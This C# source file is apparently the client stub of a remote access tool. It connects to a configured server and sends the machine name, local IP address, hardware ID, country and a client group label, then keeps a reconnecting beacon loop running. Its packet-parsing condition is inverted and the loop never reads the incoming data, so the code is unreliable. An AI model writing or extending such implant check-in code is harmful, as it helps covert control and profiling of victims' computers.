using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Serialization;

namespace Stub
{
    public class Client
    {
        public static TcpClient _Client;
        public static bool Active = false;
        public static bool AwaitingServer = false;
        public static Socket Socket;
        public static bool CheckIfServerOnline()
        {
            TcpClient tcpClient = new TcpClient();
            bool success = false;
            try
            {
                tcpClient.Connect(Settings.ServerIP, int.Parse(Settings.ServerPort));

                success = true;
            }
            catch (Exception)
            {
                Console.WriteLine("Port closed");
                success = false;
                return false;
            }
            tcpClient.Close();
            return success;
        }

        public static void StartClient()
        {
            try
            {
                Client.AwaitingServer = false;

                _Client = new TcpClient(Settings.ServerIP, int.Parse(Settings.ServerPort));

                Console.WriteLine("Server online..");

                Socket = _Client.Client;

                // Send data about pc to server..
                ClientConnectionsListObject clientConnectionsListObject = new ClientConnectionsListObject();
                clientConnectionsListObject.PCName = Environment.MachineName;
                clientConnectionsListObject.ClientGroup = Settings.ClientGroup;
                IPEndPoint endPoint = _Client.Client.LocalEndPoint as IPEndPoint;
                clientConnectionsListObject.IPAddress = endPoint.Address.ToString();
                clientConnectionsListObject.HardwareID = ClientUtils.HWID();
                clientConnectionsListObject.Country = System.Globalization.RegionInfo.CurrentRegion.DisplayName;
                using (StringWriter textWriter = new StringWriter())
                {
                    new XmlSerializer(typeof(ClientConnectionsListObject)).Serialize(textWriter, clientConnectionsListObject);
                    var msg = textWriter.ToString();
                    byte[] data = Encoding.ASCII.GetBytes(msg);

                    Console.WriteLine("Sending client data..");

                    Console.WriteLine(msg);

                    _Client.GetStream().Write(data, 0, data.Length);
                }

                Active = true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Active = false;
                AwaitingServer = true;
            }
        }
        public static string ParseReceivedPacket(TcpClient client)
        {
            try
            {
                NetworkStream stream = client.GetStream();

                if (client.Connected && stream.CanRead && stream.DataAvailable)
                    return "packet could not be parsed.";

                // Parse packet msg
                byte[] buffer = new byte[65535];
                stream.Read(buffer, 0, buffer.Length);
                int recv = 0;
                foreach (byte b in buffer)
                {
                    if (b != 0)
                    {
                        recv++;
                    }
                }
                return Encoding.UTF8.GetString(buffer, 0, recv);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return "packet could not be parsed.";
        }
        public static void Loop()
        {
        startloop:

            try
            {
                while (true)
                {
                    if (!Active || AwaitingServer)
                    {
                        Thread.Sleep(50);
                        continue;
                    }
                    // Keep socket up to date.
                    Socket = _Client.Client;
                    if (Socket.Poll(50, SelectMode.SelectRead))
                    {
                        var stream = _Client.GetStream();
                        if (stream.DataAvailable)
                        {
                            Console.WriteLine("Data available..");
                            StreamReader sr = new StreamReader(stream);

                            // Give the connection breathing room.. .. .. .. ........
                            Thread.Sleep(50);
                        }
                        else
                        {
                            Console.WriteLine("Connection closed..");
                            Console.WriteLine("Attempting server reconnect..");

                            Active = false;
                            AwaitingServer = true;
                            continue;

                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                goto startloop;
            }
        }
        public static void DisposeListener()
        {
            try
            {
                _Client.Close();
                Socket.Dispose();
                Active = false;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
